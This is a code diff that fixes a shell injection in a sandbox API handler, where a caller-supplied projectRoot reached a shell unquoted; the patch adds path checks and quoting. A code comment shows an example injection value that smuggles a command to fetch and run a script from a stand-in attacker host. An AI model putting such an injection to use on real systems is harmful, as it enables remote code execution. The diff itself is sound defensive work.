@@ -46,7 +46,21 @@ module.exports = async function handler(req, res) {
   const command = typeof body.command === 'string' ? body.command.trim() : '';
   if (!command) return sendJson(res, 400, { error: 'A start command is required.' });
 
-  const projectRoot = typeof body.projectRoot === 'string' ? body.projectRoot : PROJECT_ROOT;
+  /*
+   * `projectRoot` is caller-supplied and reaches a shell, so it gets the same
+   * treatment its sibling endpoints give `cwd` and `logPath`: a `startsWith('/')`
+   * gate, a `..` rejection, and single-quoting on the way into the command.
+   *
+   * Without the quoting, `{"projectRoot":"/tmp; curl evil.tld/x|sh; cd /"}` is
+   * executed verbatim. The blast radius is the caller's own sandbox under their
+   * own key rather than this host — `exec.js` says as much about its own limits —
+   * but it was the one place in `api/sandbox/` where a caller string reached a
+   * shell unescaped, which is exactly the kind of inconsistency that gets copied.
+   */
+  const rawRoot = typeof body.projectRoot === 'string' ? body.projectRoot : '';
+  const projectRoot =
+    rawRoot.startsWith('/') && !rawRoot.split(/[\\/]/).includes('..') ? rawRoot : PROJECT_ROOT;
+
   const logs = [];
   const log = (stream, text) => {
     if (!text) return;
@@ -62,7 +76,7 @@ module.exports = async function handler(req, res) {
      * /api/sandbox/logs tails the file afterwards.
      */
     const logPath = `${projectRoot}/.gbcoder-dev.log`;
-    const wrapped = `cd ${projectRoot} && nohup sh -c ${shellQuote(command)} > ${logPath} 2>&1 &`;
+    const wrapped = `cd ${shellQuote(projectRoot)} && nohup sh -c ${shellQuote(command)} > ${shellQuote(logPath)} 2>&1 &`;
 
     log('system', `$ ${command}`);
     await sandbox.commands.run(wrapped, {
